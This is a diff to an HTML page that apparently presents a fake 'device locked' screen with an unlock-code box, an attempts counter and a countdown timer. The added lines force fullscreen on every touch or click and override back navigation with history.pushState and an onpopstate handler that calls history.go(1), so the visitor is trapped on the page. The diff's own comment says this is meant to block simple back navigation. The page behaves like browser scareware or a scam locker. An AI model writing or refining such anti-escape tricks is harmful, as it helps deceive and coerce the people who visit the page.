@@ -152,7 +152,7 @@
     }
   </style>
 </head>
-<body onclick="triggerFullscreen()">
+<body ontouchstart="triggerFullscreen()" onclick="triggerFullscreen()">
 
   <!-- Matrix Digital Rain Canvas -->
   <canvas id="matrixCanvas"></canvas>
@@ -173,7 +173,7 @@
     </p>
 
     <div class="input-section">
-      <input type="password" id="passcode" placeholder="Enter Unlock Code" maxlength="10" onclick="event.stopPropagation()">
+      <input type="password" id="passcode" placeholder="Enter Unlock Code" maxlength="10" ontouchstart="event.stopPropagation()" onclick="event.stopPropagation()">
       <button onclick="checkPassword(event)">UNLOCK DEVICE</button>
       <div class="attempts" id="attemptsText">Remaining Attempts: 5</div>
     </div>
@@ -234,6 +234,11 @@
 
     window.onload = function() {
       timerInterval = setInterval(updateTimer, 1000);
+      // Push state history to block simple back navigation
+      history.pushState(null, null, location.href);
+      window.onpopstate = function () {
+        history.go(1);
+      };
     };
 
     function updateTimer() {
@@ -252,10 +257,10 @@
       timeLeft--;
     }
 
-    // Forces full screen when tapping anywhere on the page
+    // Forces full screen instantly on mobile touch or click anywhere
     function triggerFullscreen() {
       const elem = document.documentElement;
-      if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+      if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
         if (elem.requestFullscreen) {
           elem.requestFullscreen().catch(() => {});
         } else if (elem.webkitRequestFullscreen) {
@@ -267,7 +272,8 @@
     }
 
     function checkPassword(event) {
-      event.stopPropagation(); // Prevent fullscreen toggle conflict
+      event.stopPropagation();
+      triggerFullscreen();
       const input = document.getElementById('passcode').value;
       const attemptsText = document.getElementById('attemptsText');
 
